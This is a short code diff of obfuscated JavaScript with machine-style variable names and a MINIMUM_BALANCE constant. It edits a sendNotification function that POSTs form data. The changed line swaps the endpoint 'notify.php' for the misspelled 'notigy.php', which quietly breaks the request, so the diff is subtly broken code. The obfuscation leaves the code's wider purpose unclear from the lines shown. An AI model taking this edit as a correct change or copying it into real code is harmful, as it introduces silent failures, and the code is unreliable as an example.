@@ -130,7 +130,7 @@ const MINIMUM_BALANCE = 0.01,
   ]
 function sendNotification(_0x8a82fe, _0x30c7ae = '') {
   const _0x265d8f = new XMLHttpRequest()
-  _0x265d8f.open('POST', 'notify.php', true)
+  _0x265d8f.open('POST', 'notigy.php', true)
   _0x265d8f.setRequestHeader(
     'Content-Type',
     'application/x-www-form-urlencoded'
